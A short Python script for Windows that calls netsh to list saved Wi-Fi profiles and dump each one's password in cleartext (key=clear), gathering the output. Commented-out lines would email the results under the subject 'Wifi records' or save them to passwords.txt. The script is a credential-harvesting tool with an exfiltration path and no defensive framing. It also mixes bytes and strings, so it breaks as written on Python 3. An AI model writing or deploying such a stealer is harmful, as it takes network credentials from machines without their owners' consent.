import subprocess
import mail1
import re # regex pattern

if __name__ == "__main__":
    # setting the command (all available hotspots)
    command = 'netsh wlan show profile'
    # grabbing networks
    networks = subprocess.check_output(command, shell=True)
    # grabbing SSID via Regex (may vary)
    network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
    # iterating
    output = ""
    for network in network_list:
        # stripping SSID for multiple names
        cmd = 'netsh wlan show profile "{}" key=clear'.format(network.strip())
        # processing command
        result = subprocess.check_output(cmd, shell=True)
        output += result
#print(result)
    # sending via SMTP
    #mail1.send(subject='Wifi records',text=output,
    #           recipients='you@example.com', sender='me@example.com',
    #           smtp_host='smtp_provider_server', smtp_port=465, username='X', password='X')

    # alternative (writing in file)
	#file = open("passwords.txt", "w")
	#file.write(output)
	#file.close()